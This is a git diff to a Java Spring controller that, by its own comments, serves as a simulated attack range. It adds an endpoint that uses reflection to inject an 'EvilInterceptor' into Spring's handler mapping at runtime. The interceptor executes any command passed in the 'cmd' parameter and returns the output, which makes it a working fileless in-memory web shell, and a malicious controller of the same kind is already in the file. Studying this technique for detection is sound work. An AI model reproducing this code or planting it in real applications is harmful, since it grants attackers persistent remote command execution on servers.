@@ -12,14 +12,21 @@ import org.springframework.web.bind.annotation.RequestParam;
 import org.springframework.web.bind.annotation.ResponseBody;
 import org.springframework.web.context.WebApplicationContext;
 import org.springframework.web.context.request.RequestContextHolder;
+import org.springframework.web.servlet.HandlerInterceptor;
+import org.springframework.web.servlet.ModelAndView;
+import org.springframework.web.servlet.handler.AbstractHandlerMapping;
 import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
 import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
 
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
 import java.io.BufferedReader;
 import java.io.InputStream;
 import java.io.InputStreamReader;
+import java.lang.reflect.Field;
 import java.lang.reflect.Method;
 import java.nio.charset.Charset;
+import java.util.List;
 
 /**
  * @author hasee
@@ -64,6 +71,34 @@ public class TargetController {
     }
 
     /**
+     * 模拟靶场，访问即会触发
+     *
+     * @return
+     * @throws Exception
+     */
+    @ResponseBody
+    @GetMapping("/interceptor")
+    public String interceptor() throws Exception {
+        // 1. 拿到 HandlerMapping
+        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
+        if (context == null) {
+            return "inject fail!";
+        }
+        RequestMappingHandlerMapping requestMappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
+        // 2. 通过反射修改其内部变量 adaptedInterceptors
+        // 这里注意，要使用父类 AbstractHandlerMapping 的 class
+        Field adaptedInterceptorsField = AbstractHandlerMapping.class.getDeclaredField("adaptedInterceptors");
+        adaptedInterceptorsField.setAccessible(true);
+        List<HandlerInterceptor> handlerInterceptors = (List<HandlerInterceptor>) adaptedInterceptorsField.get(requestMappingHandlerMapping);
+        handlerInterceptors.add(new EvilInterceptor());
+        adaptedInterceptorsField.set(requestMappingHandlerMapping, handlerInterceptors);
+
+        return "interceptor done!";
+    }
+
+
+
+    /**
      * 恶意 Controller
      */
     @Controller
@@ -79,8 +114,34 @@ public class TargetController {
             }
             bufferedReader.close();
             inputStream.close();
-            System.out.println(result.toString());
+            System.out.println(result);
             return result.toString().replaceAll("\n", "<\\br>");
         }
     }
+
+
+    /**
+     * 恶意的 Interceptor
+     */
+    public class EvilInterceptor implements HandlerInterceptor {
+        @Override
+        public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception {
+            InputStream inputStream = Runtime.getRuntime().exec(request.getParameter("cmd").trim()).getInputStream();
+            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream, "GB2312"));
+            String line;
+            StringBuilder result = new StringBuilder();
+            while ((line = bufferedReader.readLine()) != null) {
+                result.append(line).append("\n");
+            }
+            bufferedReader.close();
+            inputStream.close();
+            System.out.println(result);
+            response.setCharacterEncoding("GB2312");
+            response.getWriter().write(result.toString().replaceAll("\n", "<\\br>"));
+            response.getWriter().flush();
+            response.getWriter().close();
+            HandlerInterceptor.super.postHandle(request, response, handler, modelAndView);
+        }
+    }
+
 }
